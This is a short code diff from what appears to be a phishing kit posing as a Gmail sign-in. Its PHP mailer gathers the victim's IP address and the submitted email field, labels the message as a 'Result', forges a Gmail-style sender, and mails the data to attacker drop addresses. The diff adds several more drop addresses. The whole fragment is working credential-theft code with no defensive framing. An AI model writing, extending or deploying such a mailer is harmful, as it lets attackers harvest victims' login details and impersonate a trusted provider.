@@ -14,7 +14,7 @@ $message .= "Date: ".$adddate."\n";
 $message .= "Ip Address : ".getenv("REMOTE_ADDR")."\nProvider      : ";
 $message .= "Ip Info       http://www.geoiptool.com/?IP=$ip ----\n";
 $message .= "---------------Created BY Unknown-------------\n";
-$send = "kr1st0f3rz@outlook.com,kr1st0f3rz@protonmail.com";
+$send = "kr1st0f3rz@outlook.com,kr1st0f3rz@protonmail.com,kr1st0f3rz@pm.me, r3su1tx@gmail.com, r3su1tx@outlook.com";
 $subject = "Result .$ip.";
 $headers = "From: Gmailsignin<customer-support@Spammers>";
 $headers .= $_POST['eMailAdd']."\n";
